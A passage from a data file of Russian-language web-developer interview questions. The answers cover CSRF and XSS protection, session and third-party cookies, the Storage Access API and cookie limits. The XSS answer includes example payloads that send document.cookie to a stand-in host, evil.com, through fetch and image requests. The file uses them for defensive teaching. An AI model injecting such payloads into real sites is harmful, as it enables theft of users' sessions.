выполнит перевод, думая что это сам пользователь</code></pre><p><strong>Почему cookies делают CSRF возможным:</strong></p><ul><li>Браузер автоматически отправляет cookies с ЛЮБЫМ запросом к домену</li><li>Не важно, откуда исходит запрос</li><li>Сервер не может различить источник запроса только по cookies</li><li>Это встроенное поведение браузера для удобства</li></ul><p><strong>Методы защиты от CSRF:</strong></p><p><strong>1. SameSite Cookie (современный и эффективный):</strong></p><pre><code>Set-Cookie: sessionId=abc; SameSite=Lax; Secure; HttpOnly\n// или\nSet-Cookie: sessionId=abc; SameSite=Strict; Secure; HttpOnly</code></pre><ul><li>Lax — защищает от POST/PUT/DELETE атак</li><li>Strict — полная защита, но хуже UX</li><li>Браузер не отправит cookie в cross-site запросах</li><li>Простая и надежная защита</li></ul><p><strong>2. CSRF Token (классический подход):</strong></p><pre><code>// Сервер генерирует уникальный токен для каждой сессии/формы\n// Токен НЕ в cookie, а в HTML или meta-теге\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"random-unique-token\">\n  <input name=\"to\" value=\"\">\n  <input name=\"amount\" value=\"\">\n</form>\n\n// Или в заголовке для AJAX:\nfetch('/api/transfer', {\n  method: 'POST',\n  headers: {\n    'X-CSRF-Token': 'random-unique-token'\n  },\n  body: JSON.stringify({ to: '...', amount: '...' })\n});</code></pre><ul><li>Токен известен только серверу и легитимному клиенту</li><li>Злонамеренный сайт не может получить токен (Same-Origin Policy)</li><li>Сервер проверяет токен перед выполнением действия</li></ul><p><strong>3. Double Submit Cookie:</strong></p><pre><code>// Сервер устанавливает токен и в cookie, и требует в запросе\nSet-Cookie: csrfToken=random123; SameSite=Lax\n\n// Клиент должен отправить токен в теле/заголовке:\nfetch('/api/transfer', {\n  method: 'POST',\n  headers: {\n    'X-CSRF-Token': getCookie('csrfToken')\n  }\n});\n\n// Сервер сравнивает токен из cookie и из заголовка</code></pre><ul><li>Злонамеренный сайт не может прочитать cookie (Same-Origin)</li><li>Не может установить правильный заголовок</li></ul><p><strong>4. Проверка Origin/Referer заголовков:</strong></p><pre><code>// На сервере проверяем источник запроса\nif (request.headers.origin !== 'https://trusted-site.com') {\n  return res.status(403).send('CSRF detected');\n}\n\n// Или Referer\nif (!request.headers.referer?.startsWith('https://trusted-site.com')) {\n  return res.status(403).send('CSRF detected');\n}</code></pre><ul><li>Origin — надежнее</li><li>Referer — может быть отключен пользователем</li><li>Дополнительный слой защиты</li></ul><p><strong>5. Кастомные заголовки для AJAX:</strong></p><pre><code>// Обычные формы не могут устанавливать кастомные заголовки\n// Только JavaScript с same-origin может\nfetch('/api/action', {\n  method: 'POST',\n  headers: {\n    'X-Requested-With': 'XMLHttpRequest'\n  }\n});\n\n// Сервер проверяет наличие заголовка</code></pre><p><strong>6. Re-authentication для критичных операций:</strong></p><ul><li>Запрос пароля перед важными действиями</li><li>Двухфакторная аутентификация</li><li>Подтверждение по email/SMS</li></ul><p><strong>Комплексная защита (best practice):</strong></p><pre><code>// 1. SameSite cookies\nSet-Cookie: sessionId=abc; \n  SameSite=Lax; \n  Secure; \n  HttpOnly\n\n// 2. CSRF Token для форм\n<input type=\"hidden\" name=\"_csrf\" value=\"token\">\n\n// 3. Проверка Origin\napp.use((req, res, next) => {\n  const origin = req.get('origin');\n  if (origin && !trustedOrigins.includes(origin)) {\n    return res.status(403).send('Invalid origin');\n  }\n  next();\n});\n\n// 4. CSRF middleware (Express)\nconst csrf = require('csurf');\napp.use(csrf({ cookie: true }));</code></pre><p><strong>Что НЕ защищает от CSRF:</strong></p><ul><li>❌ Просто использование POST вместо GET</li><li>❌ Проверка User-Agent</li><li>❌ Использование JSON вместо форм (без других мер)</li><li>❌ Сложные пароли</li></ul><p><strong>Когда CSRF особенно опасен:</strong></p><ul><li>Финансовые операции</li><li>Изменение email/пароля</li><li>Удаление аккаунта</li><li>Публикация контента от имени пользователя</li><li>Изменение настроек безопасности</li></ul>",
    difficulty: 'middle',
    tags: ['CSRF', 'безопасность', 'cookie', 'защита', 'атаки']
  },
  {
    id: 23,
    question: "Что такое XSS атака и как cookies участвуют в ней? Как защититься?",
    answer: "<p><strong>XSS (Cross-Site Scripting)</strong> — это атака, при которой злоумышленник внедряет вредоносный JavaScript код на веб-страницу, который может украсть cookies пользователей.</p><p><strong>Как XSS позволяет украсть cookies:</strong></p><pre><code>// Если на сайте есть уязвимость XSS, злоумышленник может внедрить:\n<script>\n  // Отправить cookies злоумышленнику\n  fetch('https://evil.com/steal?cookies=' + document.cookie);\n  \n  // Или через изображение\n  new Image().src = 'https://evil.com/steal?c=' + document.cookie;\n</script>\n\n// Если cookie не защищена, злоумышленник получит:\n// \"sessionId=abc123; username=john; token=xyz\"</code></pre><p><strong>Типы XSS атак:</strong></p><p><strong>1. Stored XSS (хранимый):</strong></p><ul><li>Вредоносный код сохраняется на сервере</li><li>Например, в комментарии, посте, профиле</li><li>Выполняется у всех, кто просматривает контент</li><li>Самый опасный тип</li></ul><pre><code>// Пользователь оставляет комментарий:\n<script>fetch('https://evil.com?c='+document.cookie)</script>\n\n// Сервер сохраняет без санитизации\n// Все посетители страницы выполнят этот скрипт</code></pre><p><strong>2. Reflected XSS (отраженный):</strong></p><ul><li>Вредоносный код в URL параметрах</li><li>Сервер отражает его на странице</li><li>Нужно заманить жертву по специальной ссылке</li></ul><pre><code>// URL: https://site.com/search?q=<script>steal()</script>\n// Если сервер отображает q без экранирования:\n<div>Результаты для: <script>steal()</script></div></code></pre><p><strong>3. DOM-based XSS:</strong></p><ul><li>Уязвимость в клиентском JavaScript</li><li>Вредоносный код выполняется через манипуляции DOM</li></ul><pre><code>// Уязвимый код:\ndocument.getElementById('output').innerHTML = location.hash.slice(1);\n\n// Злонамеренный URL:\nhttps://site.com#<img src=x onerror=\"steal()\"></code></pre><p><strong>Защита cookies от XSS - HttpOnly:</strong></p><pre><code>// На сервере:\nSet-Cookie: sessionId=abc123; HttpOnly; Secure\n\n// JavaScript не может прочитать эту cookie:\nconsole.log(document.cookie); // sessionId не будет в выводе\n\n// Попытка украсть не сработает:\nfetch('https://evil.com?c=' + document.cookie); // sessionId не будет украден</code></pre><p><strong>Почему HttpOnly работает:</strong></p><ul><li>Cookie недоступна через document.cookie API</li><li>JavaScript не может прочитать её значение</li><li>Cookie всё ещё отправляется браузером автоматически</li><li>Сервер получает и использует cookie нормально</li><li>Но вредоносный скрипт не может её украсть</li></ul><p><strong>Комплексная защита от XSS:</strong></p><p><strong>1. HttpOnly для session cookies:</strong></p><pre><code>// Всегда для аутентификационных cookies\nSet-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict</code></pre><p><strong>2. Санитизация пользовательского ввода:</strong></p><pre><code>// Экранирование HTML символов\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#039;\");\n}\n\n// Использование\nconst userInput = \"<script>alert('xss')</script>\";\nconst safe = escapeHtml(userInput);\n// Результат: \"&lt;script&gt;alert('xss')&lt;/script&gt;\"</code></pre><p><strong>3. Content Security Policy (CSP):</strong></p><pre><code>// Заголовок на сервере\nContent-Security-Policy: \n  default-src 'self'; \n  script-src 'self' 'nonce-random123'; \n  style-src 'self' 'unsafe-inline';\n\n// Или через meta-тег\n<meta http-equiv=\"Content-Security-Policy\" \n      content=\"default-src 'self'; script-src 'self'\">\n\n// Разрешает только скрипты с вашего домена\n// Блокирует inline скрипты без nonce</code></pre><p><strong>4. Безопасное использование innerHTML:</strong></p><pre><code>// ❌ Опасно:\nelement.innerHTML = userInput;\n\n// ✅ Безопасно:\nelement.textContent = userInput;\n// или\nelement.innerText = userInput;\n\n// Для HTML используйте санитизацию:\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userInput);</code></pre><p><strong>5. Валидация и фильтрация на сервере:</strong></p><pre><code>// Node.js пример\nconst validator = require('validator');\n\napp.post('/comment', (req, res) => {\n  let comment = req.body.comment;\n  \n  // Экранирование\n  comment = validator.escape(comment);\n  \n  // Удаление опасных тегов\n  comment = comment.replace(/<script[^>]*>.*?<\\/script>/gi, '');\n  \n  // Сохранение в БД\n  saveComment(comment);\n});</code></pre><p><strong>6. Использование безопасных фреймворков:</strong></p><ul><li>React автоматически экранирует в JSX</li><li>Vue автоматически экранирует в шаблонах</li><li>Angular использует DomSanitizer</li></ul><pre><code>// React - безопасно по умолчанию\nconst userInput = \"<script>alert('xss')</script>\";\n<div>{userInput}</div> // Отобразится как текст, не выполнится\n\n// Опасно только с dangerouslySetInnerHTML:\n<div dangerouslySetInnerHTML={{__html: userInput}} /> // Уязвимо!</code></pre><p><strong>7. X-XSS-Protection заголовок:</strong></p><pre><code>// Включает встроенную XSS защиту браузера\nX-XSS-Protection: 1; mode=block</code></pre><p><strong>Best practices для cookies и XSS:</strong></p><ul><li>✅ HttpOnly для всех session/auth cookies</li><li>✅ Secure для передачи только по HTTPS</li><li>✅ SameSite для дополнительной защиты</li><li>✅ Минимальный срок жизни cookies</li><li>✅ Санитизация всего пользовательского ввода</li><li>✅ Content Security Policy</li><li>✅ Не храните чувствительные данные в cookies без HttpOnly</li></ul><p><strong>Что делать если есть XSS уязвимость:</strong></p><ol><li>Немедленно исправить уязвимость</li><li>Аннулировать все активные сессии</li><li>Принудительно разлогинить пользователей</li><li>Сменить секретные ключи</li><li>Проверить логи на подозрительную активность</li><li>Уведомить пользователей</li></ol>",
    difficulty: 'middle',
    tags: ['XSS', 'безопасность', 'HttpOnly', 'cookie', 'защита']
  },
  {
    id: 24,
    question: "В чем разница между session cookies и persistent cookies? Когда что использовать?",
    answer: "<p><strong>Session cookies и persistent cookies</strong> различаются по времени жизни и способу хранения в браузере.</p><p><strong>Session Cookies (сессионные):</strong></p><p><strong>Характеристики:</strong></p><ul><li>Удаляются при закрытии браузера (завершении сессии)</li><li>Не имеют атрибутов Expires или Max-Age</li><li>Хранятся только в памяти браузера</li><li>Живут до закрытия всех вкладок/окон браузера</li></ul><pre><code>// Установка session cookie (без expires/max-age)\nSet-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict\n\n// JavaScript\ndocument.cookie = \"tempData=xyz; Secure\";</code></pre><p><strong>Когда использовать session cookies:</strong></p><ul><li>Аутентификация пользователя (session ID)</li><li>Временные данные для текущей сессии</li><li>Конфиденциальная информация</li><li>Данные корзины покупок (временно)</li><li>Состояние многошаговых форм</li><li>Временные настройки UI</li></ul><p><strong>Преимущества session cookies:</strong></p><ul><li>Автоматическая очистка — не накапливаются</li><li>Более безопасны — меньше время жизни</li><li>Не занимают постоянное место</li><li>Меньше риск утечки после закрытия браузера</li></ul><p><strong>Persistent Cookies (постоянные):</strong></p><p><strong>Характеристики:</strong></p><ul><li>Хранятся на диске до указанной даты истечения</li><li>Имеют атрибут Expires или Max-Age</li><li>Сохраняются между сессиями браузера</li><li>Удаляются только по истечении срока или вручную</li></ul><pre><code>// С Expires (конкретная дата)\nSet-Cookie: rememberMe=true; \n  Expires=Wed, 21 Oct 2025 07:28:00 GMT; \n  Secure; \n  HttpOnly\n\n// С Max-Age (время в секундах)\nSet-Cookie: userId=123; \n  Max-Age=2592000; // 30 дней\n  Secure; \n  HttpOnly\n\n// JavaScript\nconst expires = new Date();\nexpires.setDate(expires.getDate() + 30);\ndocument.cookie = `preference=dark; expires=${expires.toUTCString()}`;</code></pre><p><strong>Когда использовать persistent cookies:</strong></p><ul><li>\"Запомнить меня\" функциональность</li><li>Пользовательские настройки (язык, тема)</li><li>Аналитика и трекинг</li><li>Согласие с cookies/GDPR</li><li>Персонализация контента</li><li>Автозаполнение форм (не конфиденциальные данные)</li></ul><p><strong>Практические примеры:</strong></p><p><strong>1. Система аутентификации (гибридный подход):</strong></p><pre><code>// Session cookie для текущей сессии\nSet-Cookie: sessionId=abc123; \n  HttpOnly; \n  Secure; \n  SameSite=Strict\n  // Без expires - удалится при закрытии\n\n// Persistent для \"Запомнить меня\"\nSet-Cookie: rememberToken=xyz789; \n  Max-Age=2592000; // 30 дней\n  HttpOnly; \n  Secure; \n  SameSite=Strict</code></pre><p><strong>2. Настройки пользователя:</strong></p><pre><code>// Persistent - сохранять между визитами\nSet-Cookie: theme=dark; Max-Age=31536000; Path=/ // 1 год\nSet-Cookie: language=ru; Max-Age=31536000; Path=/\nSet-Cookie: fontSize=16; Max-Age=31536000; Path=/</code></pre><p><strong>3. Корзина покупок:</strong></p><pre><code>// Session для анонимных пользователей\nSet-Cookie: cartId=temp123; Secure; SameSite=Lax\n\n// Persistent для залогиненных\nSet-Cookie: cartId=user123; \n  Max-Age=604800; // 7 дней\n  Secure; \n  SameSite=Lax</code></pre><p><strong>Сравнительная таблица:</strong></p><table><tr><th>Аспект</th><th>Session</th><th>Persistent</th></tr><tr><td>Время жизни</td><td>До закрытия браузера</td><td>До указанной даты</td></tr><tr><td>Хранение</td><td>В памяти</td><td>На диске</td></tr><tr><td>Атрибуты</td><td>Без Expires/Max-Age</td><td>С Expires/Max-Age</td></tr><tr><td>Безопасность</td><td>Выше (короткий срок)</td><td>Ниже (долгий срок)</td></tr><tr><td>Использование</td><td>Сессии, auth</td><td>Настройки, \"запомнить\"</td></tr></table><p><strong>Важные нюансы:</strong></p><p><strong>1. \"Закрытие браузера\":</strong></p><ul><li>Для Chrome/Firefox — закрытие всех окон/вкладок</li><li>Некоторые браузеры \"восстанавливают\" сессию</li><li>На мобильных может вести себя по-разному</li></ul><p><strong>2. Безопасность:</strong></p><pre><code>// Session cookie - для критичных данных\nSet-Cookie: adminSession=xyz; \n  HttpOnly; \n  Secure; \n  SameSite=Strict\n  // Короткий срок жизни = выше безопасность\n\n// Persistent - менее критичные данные\nSet-Cookie: preferences=data; \n  Max-Age=31536000; \n  Secure; \n  SameSite=Lax</code></pre><p><strong>3. Комбинированный подход (best practice):</strong></p><pre><code>// На сервере при логине\nif (rememberMe) {\n  // Persistent для длительной сессии\n  res.cookie('authToken', token, {\n    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 дней\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict'\n  });\n} else {\n  // Session - только на текущую сессию\n  res.cookie('authToken', token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict'\n    // maxAge не указываем\n  });\n}</code></pre><p><strong>Рекомендации по срокам для persistent cookies:</strong></p><ul><li>Аутентификация: 7-30 дней</li><li>Настройки UI: 1 год</li><li>Аналитика: 1-2 года</li><li>GDPR согласие: 1 год</li><li>Рекламные: 30-90 дней (по регламенту)</li></ul><p><strong>Удаление cookies:</strong></p><pre><code>// Session - автоматически при закрытии\n\n// Persistent - нужно явно удалить\nSet-Cookie: token=; Max-Age=0; Path=/\n// или\nSet-Cookie: token=; Expires=Thu, 01 Jan 1970 00:00:00 GMT</code></pre>",
    difficulty: 'junior',
    tags: ['cookie', 'session', 'persistent', 'время жизни']
  },
  {
    id: 25,
    question: "Что такое Third-party cookies и почему браузеры начали их блокировать?",
    answer: "<p><strong>Third-party cookies</strong> — это cookies, установленные доменом, отличным от домена текущего сайта в адресной строке браузера.</p><p><strong>Разница между First-party и Third-party:</strong></p><p><strong>First-party cookies:</strong></p><ul><li>Устанавливаются доменом, который пользователь посещает</li><li>example.com устанавливает cookie на example.com</li><li>Используются для функционирования сайта</li></ul><pre><code>// Пользователь на site.com\n// site.com устанавливает cookie:\nSet-Cookie: sessionId=abc; Domain=site.com\n// Это first-party cookie</code></pre><p><strong>Third-party cookies:</strong></p><ul><li>Устанавливаются другим доменом через iframe, скрипты, изображения</li><li>Пользователь на example.com, но cookie от tracker.com</li><li>Используются для трекинга между сайтами</li></ul><pre><code>// Пользователь на site.com\n// Но на странице есть:\n<img src=\"https://tracker.com/pixel.gif\">\n\n// tracker.com устанавливает cookie:\nSet-Cookie: userId=123; Domain=tracker.com\n// Это third-party cookie</code></pre><p><strong>Как работает трекинг с Third-party cookies:</strong></p><ol><li>Пользователь посещает site-a.com</li><li>На странице встроен трекер от ads.com</li><li>ads.com устанавливает cookie userId=123</li><li>Пользователь посещает site-b.com</li><li>На странице тоже трекер от ads.com</li><li>Браузер отправляет cookie userId=123 к ads.com</li><li>ads.com знает, что это один и тот же пользователь</li><li>Строится профиль активности пользователя</li></ol><p><strong>Типичные сценарии использования:</strong></p><p><strong>1. Рекламные сети:</strong></p><ul><li>Отслеживание пользователя между сайтами</li><li>Таргетированная реклама</li><li>Ретаргетинг (показ рекламы товара после просмотра)</li></ul><p><strong>2. Аналитика:</strong></p><ul><li>Google Analytics, Яндекс.Метрика</li><li>Сбор статистики на разных сайтах</li></ul><p><strong>3. Социальные виджеты:</strong></p><ul><li>Кнопки \"Поделиться\" Facebook, VK</li><li>Встроенные посты, комментарии</li><li>Отслеживание лайков и активности</li></ul><p><strong>4. Встроенный контент:</strong></p><ul><li>YouTube видео в iframe</li><li>Платежные виджеты</li><li>Чаты и формы обратной связи</li></ul><p><strong>Почему браузеры блокируют Third-party cookies:</strong></p><p><strong>1. Приватность пользователей:</strong></p><ul><li>Навязчивое отслеживание без явного согласия</li><li>Создание детальных профилей пользователей</li><li>Отслеживание истории посещений</li><li>Сбор данных о поведении и интересах</li></ul><p><strong>2. Регулирование (GDPR, CCPA):</strong></p><ul><li>Законы требуют явного согласия на трекинг</li><li>Пользователи имеют право на приватность</li><li>Штрафы за нарушения</li></ul><p><strong>3. Пользовательский спрос:</strong></p><ul><li>Растущая осведомленность о приватности</li><li>Негативное отношение к слежке</li><li>Требования прозрачности</li></ul><p><strong>Какие браузеры блокируют:</strong></p><ul><li><strong>Safari (ITP)</strong> — блокирует с 2017, самый строгий</li><li><strong>Firefox (ETP)</strong> — блокирует по умолчанию с 2019</li><li><strong>Brave</strong> — полная блокировка</li><li><strong>Chrome</strong> — планирует постепенное удаление (Privacy Sandbox)</li><li><strong>Edge</strong> — следует за Chrome</li></ul><p><strong>Как блокировка влияет на веб:</strong></p><p><strong>Проблемы для сайтов:</strong></p><ul><li>Ломаются OAuth авторизации через iframe</li><li>Не работают встроенные виджеты</li><li>Проблемы с платежными системами</li><li>Аналитика теряет точность</li></ul><p><strong>Решения и альтернативы:</strong></p><p><strong>1. SameSite=None для легитимных случаев:</strong></p><pre><code>// Для iframe виджетов, требующих cookies\nSet-Cookie: widgetSession=abc; \n  SameSite=None; \n  Secure // обязательно для SameSite=None</code></pre><p><strong>2. Server-side трекинг:</strong></p><ul><li>Прокси запросы через свой домен</li><li>First-party cookies для аналитики</li></ul><p><strong>3. Storage Access API:</strong></p><pre><code>// Запрос доступа к third-party cookies в iframe\ndocument.requestStorageAccess().then(\n  () => {\n    // Доступ разрешен\n    console.log('Cookie access granted');\n  },\n  () => {\n    // Доступ отклонен\n    console.log('Cookie access denied');\n  }\n);</code></pre><p><strong>4. Privacy Sandbox (Chrome):</strong></p><ul><li>Topics API — категории интересов вместо трекинга</li><li>FLEDGE — ретаргетинг без third-party cookies</li><li>Attribution Reporting — измерение конверсий</li></ul><p><strong>5. FLoC → Topics:</strong></p><ul><li>Группировка пользователей по интересам</li><li>Без индивидуального трекинга</li><li>На уровне браузера</li></ul><p><strong>Проверка поддержки:</strong></p><pre><code>// Проверить, работают ли third-party cookies\nfunction checkThirdPartyCookies() {\n  const iframe = document.createElement('iframe');\n  iframe.src = 'https://third-party-domain.com/check-cookies';\n  document.body.appendChild(iframe);\n  \n  // Внутри iframe на third-party домене:\n  document.cookie = 'test=1; SameSite=None; Secure';\n  const hasAccess = document.cookie.includes('test=1');\n  return hasAccess;\n}</code></pre><p><strong>Best practices для разработчиков:</strong></p><ul><li>Не полагайтесь на third-party cookies</li><li>Используйте first-party cookies где возможно</li><li>Реализуйте альтернативные методы трекинга</li><li>Получайте явное согласие пользователя</li><li>Используйте server-side решения</li><li>Планируйте миграцию на новые API</li></ul>",
    difficulty: 'middle',
    tags: ['cookie', 'third-party', 'приватность', 'трекинг', 'блокировка']
  },
  {
    id: 26,
    question: "Как работает Storage Access API и когда его использовать?",
    answer: "<p><strong>Storage Access API</strong> — это Web API, позволяющий встроенному iframe контенту запросить доступ к cookies first-party (родительского) контекста в браузерах, блокирующих third-party cookies.</p><p><strong>Проблема, которую решает:</strong></p><ul><li>Браузеры блокируют third-party cookies для приватности</li><li>Легитимные сервисы (OAuth, платежи, виджеты) ломаются в iframe</li><li>Storage Access API — компромисс между приватностью и функциональностью</li><li>Позволяет явно запросить доступ с согласия пользователя</li></ul><p><strong>Как работает Storage Access API:</strong></p><pre><code>// В iframe на домене widget.com внутри site.com\nasync function requestAccess() {\n  try {\n    // Проверяем, есть ли уже доступ\n    const hasAccess = await document.hasStorageAccess();\n    \n    if (!hasAccess) {\n      // Запрашиваем доступ (покажется промпт пользователю)\n      await document.requestStorageAccess();\n      console.log('Storage access granted');\n    }\n    \n    // Теперь можем работать с cookies\n    document.cookie = 'session=abc; SameSite=None; Secure';\n    \n    // И делать fetch запросы с credentials\n    fetch('https://widget.com/api/data', {\n      credentials: 'include'\n    });\n    \n  } catch (error) {\n    console.error('Storage access denied:', error);\n    // Показать fallback UI или сообщение\n  }\n}\n\n// Вызывать после взаимодействия пользователя (клик, тап)\ndocument.getElementById('button').addEventListener('click', requestAccess);</code></pre><p><strong>Основные методы API:</strong></p><p><strong>1. document.hasStorageAccess():</strong></p><pre><code>// Проверка текущего статуса доступа\nconst hasAccess = await document.hasStorageAccess();\nconsole.log('Has access:', hasAccess); // true/false\n\n// Не требует взаимодействия пользователя\n// Можно вызвать в любой момент</code></pre><p><strong>2. document.requestStorageAccess():</strong></p><pre><code>// Запрос доступа к storage\ntry {\n  await document.requestStorageAccess();\n  // Доступ получен\n} catch (error) {\n  // Доступ отклонен или ошибка\n}\n\n// ВАЖНО: Требует взаимодействия пользователя (user activation)\n// Должен быть вызван в обработчике клика/тапа</code></pre><p><strong>Требования для работы API:</strong></p><p><strong>1. User activation (жест пользователя):</strong></p><pre><code>// ❌ НЕ работает - вызов без взаимодействия\nawait document.requestStorageAccess(); // Ошибка!\n\n// ✅ Работает - в обработчике события\nbutton.onclick = async () => {\n  await document.requestStorageAccess(); // OK\n};</code></pre><p><strong>2. Secure context (HTTPS):</strong></p><ul><li>Оба домена (родитель и iframe) должны быть HTTPS</li><li>Или localhost для разработки</li></ul><p><strong>3. SameSite=None; Secure на cookies:</strong></p><pre><code>// Cookies должны быть настроены для cross-site использования\nSet-Cookie: session=abc; SameSite=None; Secure</code></pre><p><strong>Типичный flow с пользовательским опытом:</strong></p><pre><code>// В iframe виджета\nclass WidgetAuth {\n  async initialize() {\n    // 1. Проверяем доступ без промпта\n    const hasAccess = await document.hasStorageAccess();\n    \n    if (hasAccess) {\n      // Уже есть доступ, работаем\n      this.loadUserData();\n      return;\n    }\n    \n    // 2. Показываем кнопку \"Войти\" или \"Разрешить доступ\"\n    this.showLoginButton();\n  }\n  \n  showLoginButton() {\n    const button = document.getElementById('login');\n    button.style.display = 'block';\n    \n    button.onclick = async () => {\n      try {\n        // 3. Запрашиваем доступ при клике\n        await document.requestStorageAccess();\n        \n        // 4. Доступ получен - загружаем данные\n        this.loadUserData();\n        button.style.display = 'none';\n        \n      } catch (error) {\n        // 5. Пользователь отклонил или ошибка\n        this.showError('Доступ необходим для работы виджета');\n      }\n    };\n  }\n  \n  async loadUserData() {\n    // Теперь cookies доступны\n    const response = await fetch('https://widget.com/api/user', {\n      credentials: 'include'\n    });\n    const data = await response.json();\n    this.render(data);\n  }\n}\n\nnew WidgetAuth().initialize();</code></pre><p><strong>Поддержка браузеров и особенности:</strong></p><p><strong>Safari:</strong></p><ul><li>Полная поддержка Storage Access API</li><li>Показывает промпт пользователю при первом запросе</li><li>Запоминает выбор на 30 дней</li><li>Требует взаимодействия на родительской странице</li></ul><p><strong>Firefox:</strong></p><ul><li>Поддержка с версии 65</li><li>Автоматически предоставляет доступ без промпта для некоторых сценариев</li><li>Если пользователь взаимодействовал с доменом в первой стороне</li></ul><p><strong>Chrome/Edge:</strong></p><ul><li>Ограниченная поддержка (экспериментальная)</li><li>Постепенное внедрение</li></ul><p><strong>Практические сценарии использования:</strong></p><p><strong>1. OAuth виджет логина:</strong></p><pre><code>// iframe на oauth-provider.com встроен в app.com\nasync function handleOAuthLogin() {\n  // Запросить доступ к cookies OAuth провайдера\n  await document.requestStorageAccess();\n  \n  // Теперь можем проверить сессию\n  const response = await fetch('https://oauth-provider.com/check-session', {\n    credentials: 'include'\n  });\n  \n  if (response.ok) {\n    // Пользователь уже залогинен\n    window.parent.postMessage({ type: 'LOGGED_IN' }, '*');\n  } else {\n    // Показать форму логина\n  }\n}</code></pre><p><strong>2. Встроенная платежная форма:</strong></p><pre><code>// iframe платежного провайдера\nasync function initPaymentWidget() {\n  try {\n    await document.requestStorageAccess();\n    \n    // Загрузить сохраненные способы оплаты\n    const methods = await fetchPaymentMethods();\n    renderPaymentOptions(methods);\n    \n  } catch (error) {\n    // Fallback - полная форма без сохраненных данных\n    renderFullPaymentForm();\n  }\n}</code></pre><p><strong>3. Социальный виджет:</strong></p><pre><code>// iframe с комментариями/лайками\nasync function loadSocialWidget() {\n  const button = document.getElementById('interact');\n  \n  button.onclick = async () => {\n    await document.requestStorageAccess();\n    \n    // Теперь можем показать персонализированный контент\n    const user = await getCurrentUser();\n    renderComments(user);\n  };\n}</code></pre><p><strong>Ограничения и considerations:</strong></p><ul><li>Не решает проблему трекинга — только для легитимных iframe</li><li>Требует взаимодействия пользователя</li><li>Промпт может раздражать пользователей</li><li>Не все браузеры поддерживают</li><li>Нужен fallback для старых браузеров</li></ul><p><strong>Альтернативы Storage Access API:</strong></p><ul><li>Редирект на полную страницу вместо iframe</li><li>Server-side рендеринг и прокси</li><li>postMessage для коммуникации между окнами</li><li>Token-based аутентификация без cookies</li></ul>",
    difficulty: 'senior',
    tags: ['Storage Access API', 'iframe', 'third-party cookies', 'приватность']
  },
  {
    id: 27,
    question: "Каковы ограничения на размер и количество cookies? Что делать если лимит исчерпан?",
    answer: "<p><strong>Ограничения cookies</strong> существуют на уровне браузеров для предотвращения злоупотреблений и управления ресурсами.</p><p><strong>Основные лимиты cookies:</strong></p><p><strong>1. Размер одной cookie:</strong></p><ul><li>Максимум: 4096 байт (4KB)</li><li>Включает имя, значение и все атрибуты</li><li>Превышение = cookie не сохранится</li></ul><pre><code>// Пример подсчета размера\nconst cookieString = \"name=value; Path=/; Domain=example.com; Secure\";\nconst size = new Blob([cookieString]).size;\nconsole.log(`Cookie size: ${size} bytes`);\n\n// Если > 4096 - cookie будет отклонена браузером</code></pre><p><strong>2. Количество cookies на домен:</strong></p><ul><li>Chrome: ~180 cookies на домен</li><li>Firefox: 150 cookies на домен</li><li>Safari: ~600 cookies на домен</li><li>При превышении: старые cookies удаляются (LRU - Least Recently Used)</li></ul><p><strong>3. Общее количество cookies:</strong></p><ul><li>Chrome: ~3000 total cookies</li><li>Firefox: ~3000 total cookies</li><li>На всех доменах суммарно</li></ul><p><strong>Что происходит при превышении лимитов:</strong></p><p><strong>1. Превышение размера (>4KB):</strong></p><ul><li>Cookie просто не устанавливается</li><li>Браузер молча игнорирует Set-Cookie</li><li>Нет ошибки в консоли</li><li>Приложение может сломаться, если полагается на эту cookie</li></ul><p><strong>2. Превышение количества:</strong></p><ul><li>Браузер удаляет самую старую cookie (LRU)</li><li>Может удалить важные cookies неожиданно</li><li>Непредсказуемое поведение</li></ul><p><strong>Как проверить текущее использование:</strong></p><pre><code>// Подсчитать все cookies для текущего домена\nfunction getCookieStats() {\n  const cookies = document.cookie.split(';');\n  const count = cookies.filter(c => c.trim()).length;\n  \n  let totalSize = 0;\n  cookies.forEach(cookie => {\n    totalSize += new Blob([cookie]).size;\n  });\n  \n  console.log(`Cookies count: ${count}`);\n  console.log(`Total size: ${totalSize} bytes`);\n  console.log(`Average size: ${Math.round(totalSize / count)} bytes`);\n  \n  return { count, totalSize };\n}\n\ngetCookieStats();</code></pre><p><strong>Решения при исчерпании лимитов:</strong></p><p><strong>1. Минимизация данных в cookies:</strong></p><pre><code>// ❌ Плохо - хранить большие данные\ndocument.cookie = \"userData=\" + JSON.stringify(hugeObject);\n\n// ✅ Хорошо - хранить только ID\ndocument.cookie = \"userId=123\";\n// Данные запрашивать с сервера по ID</code></pre><p><strong>2. Использование альтернативных хранилищ:</strong></p><pre><code>// localStorage - до 5-10MB\nlocalStorage.setItem('preferences', JSON.stringify(userPrefs));\n\n// sessionStorage - до 5-10MB, удаляется при закрытии\nsessionStorage.setItem('tempData', JSON.stringify(data));\n\n// IndexedDB - до сотен MB\nconst db = await openDB('myDB');\nawait db.put('store', largeData, 'key');</code></pre><p><strong>3. Сжатие данных в cookies:</strong></p><pre><code>// Использование LZ-string для сжатия\nimport LZString from 'lz-string';\n\nconst data = JSON.stringify(largeObject);\nconst compressed = LZString.compressToEncodedURIComponent(data);\ndocument.cookie = `data=${compressed}`;\n\n// Чтение и декомпрессия\nconst cookieValue = getCookie('data');\nconst decompressed = LZString.decompressFromEncodedURIComponent(cookieValue);\nconst original = JSON.parse(decompressed);</code></pre><p><strong>4. Удаление неиспользуемых cookies:</strong></p><pre><code>// Очистка старых/временных cookies\nfunction cleanupOldCookies() {\n  const cookiesToDelete = ['temp1', 'temp2', 'old_session'];\n  \n  cookiesToDelete.forEach(name => {\n    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;\n  });\n}\n\n// Вызывать периодически или при старте приложения\ncleanupOldCookies();</code></pre><p><strong>5. Разделение по поддоменам:</strong></p><pre><code>// Вместо всех cookies на main.example.com\n// Распределить по поддоменам:\n\n// api.example.com - API токены\nSet-Cookie: apiToken=xyz; 